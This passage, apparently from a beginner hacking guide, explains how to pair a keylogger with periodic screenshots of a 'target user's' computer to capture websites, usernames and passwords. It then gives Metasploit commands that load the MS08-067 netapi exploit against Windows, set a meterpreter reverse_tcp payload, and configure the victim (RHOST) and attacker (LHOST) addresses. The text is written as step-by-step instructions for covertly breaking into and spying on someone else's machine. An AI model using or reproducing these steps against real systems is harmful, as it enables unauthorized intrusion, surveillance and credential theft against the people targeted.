supposed to know where the usernames and passwords are that you collect? This can be one of the shortfalls of the keylogger, but luckily you are able to combine it together with taking screenshots of the target users computer in order to get the information that you are looking.

The screenshots are useful because they will take periodic screenshots of the target users computer. When you combine this together with the keylogger, you are sure to get a clear picture of the websites that are being used during the day as well as the username and passwords that the user puts in. As long as you remember to put in the time and date stamps on both the screenshots and the keylogger, you are going to be able to compare the two and get all the information that you need.

So the first thing you will need to set up your hack. You will be able to use the MS08_067_netapi exploit if you are trying to do the hack on a Windows computer. It is pretty easy to get started with and it is the one that we are working for this section. To set up the exploit, set up the following code:

```
msf> use exploit/windows/smb/ms08_067_netapi
```

Once you have this code into the system, you will then need to add on the different processes that are going to capture the screens that you want. You will use the Metasploit's Meterpreter to do this without much hassle. If you would like to get this program to start working with the exploit we are setting up, you will just need to type in the following syntax for a code:

```
msf> (ms08_067_netapi) set payload windows/meterpreter/reverse_tcp
```

Now that you have this set up, it is time to set up the different options that you will use. There are several options are allowed on this system, and you will have some freedom to get this done. The next command will let you see all the options you would like to use, and you can pick out the choice that is going to work for you:

```
msf> (ms08_067_netapi) show options
```

At this point, it is possible to see the RHOST, or the victim that you want to use, as well as the LHOST, or your information, show up on the screen. You need to keep track of those that you are able to put them into the codes properly. If you mess them up or get mixed around, you will find it can be really hard to set up the attack. These are the IP addresses that you will need to keep things in order and to get your screenshot attack to work out well. Here are the two codes that you will need to set up if you would